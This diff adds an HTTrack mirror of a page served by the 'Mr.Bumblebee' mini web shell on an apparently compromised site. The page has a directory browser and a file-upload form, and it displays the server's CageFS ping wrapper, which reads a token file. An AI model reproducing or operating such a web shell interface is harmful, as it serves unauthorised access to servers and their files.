@@ -1,0 +1,102 @@
+<!DOCTYPE HTML>
+<html>
+
+<!-- Mirrored from genialhcpl.com/uplO&ded/5cd6c0026675d_mini.php?filesrc=//bin/ping&path=//bin by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Dec 2019 15:59:43 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<link href="#" rel="stylesheet" type="text/css">
+<title>Mr.Bumblebee</title>
+<center>
+<img src="../../i.imgur.com/wY37Uuf.jpg" style="opacity:0.5; width:150px; height:150px";></center>
+<style>
+body{
+font-family: "Tahoma";
+background-color: black;
+color:red;
+}
+#content tr:hover{
+background-color: #191919;
+text-shadow:0px 0px 10px #fff;
+}
+
+#content .first{
+background-color: #191919;
+}
+table{
+border: 1px #000000 dotted;
+}
+a{
+color:white;
+text-decoration: none;
+}
+a:hover{
+color:red;
+text-shadow:0px 0px 10px #ffffff;
+}
+input,select,textarea{
+border: 1px #000000 solid;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+}
+</style>
+</head>
+<body>
+<h1><center><font color="red">-=[ Mr.</font><font color="white"> Bumblebee ]=-</font><br>
+			<font size="2px"><font color="red"><b>_Indonesia_</b></font>
+			</center></h1>
+<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td><font color="lime">Path :</font> <a href="5cd6c0026675d_minia922.html?path=/">/</a><a href="5cd6c0026675d_mini3bda.html?path=//bin">bin</a>/</td></tr><tr><td><form enctype="multipart/form-data" method="POST">
+<font color="lime">File Upload :</font> <input type="file" name="file" />
+<input type="submit" value="upload" />
+</form>
+</td></tr><tr><td>Current File : //bin/ping</tr></td></table><br /><pre>#!/bin/bash
+##CageFS proxyexec wrapper - ver 15
+
+if [[ $EUID -eq 0 ]]; then
+    echo 'Cannot be run as root'
+    exit 1
+fi
+
+USR=`/usr/bin/whoami`
+TOKEN=`/bin/cat /var/.cagefs/.cagefs.token`
+# It's user's tmp directory and write to it is secure procedure
+# because this script is running only under usual user
+PIDFILE=&quot;/tmp/.cagefs.proxy.$$&quot;
+USER_INTERRUPT=13
+CWD=`pwd`
+
+if [ -e /var/.cagefs/origin ]; then
+ORIGIN=`/bin/cat /var/.cagefs/origin`
+REMOTE=&quot;/usr/bin/ssh -F /etc/ssh/cagefs-rexec_config $USR@$ORIGIN&quot;
+else
+REMOTE=&quot;&quot;
+fi
+
+ctrl_c_handler() {
+if [ -f $PIDFILE ]; then
+pid=`/bin/cat $PIDFILE`
+/bin/rm -f $PIDFILE &gt; /dev/null 2&gt;&amp;1
+/bin/kill -s SIGINT &quot;$pid&quot; &gt; /dev/null 2&gt;&amp;1
+fi
+exit $USER_INTERRUPT
+}
+
+if [ -z &quot;$REMOTE&quot; ]; then
+trap 'ctrl_c_handler' 2
+fi
+
+$REMOTE /usr/sbin/proxyexec -c cagefs.sock &quot;$USR&quot; &quot;$TOKEN&quot; &quot;$CWD&quot; PING $$ &quot;$@&quot;
+RETVAL=$?
+
+if [ -z &quot;$REMOTE&quot; ]; then
+/bin/rm -f $PIDFILE &gt; /dev/null 2&gt;&amp;1
+fi
+
+exit $RETVAL
+</pre><font color="red" size="2px"><center><br/><b>Copyright &copy; 2017 <font color="white">|| <font color="red">Recoded By <font color="white">Mr.Bumblebee</a></center></font>
+
+</body>
+
+<!-- Mirrored from genialhcpl.com/uplO&ded/5cd6c0026675d_mini.php?filesrc=//bin/ping&path=//bin by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 15 Dec 2019 15:59:43 GMT -->
+</html>
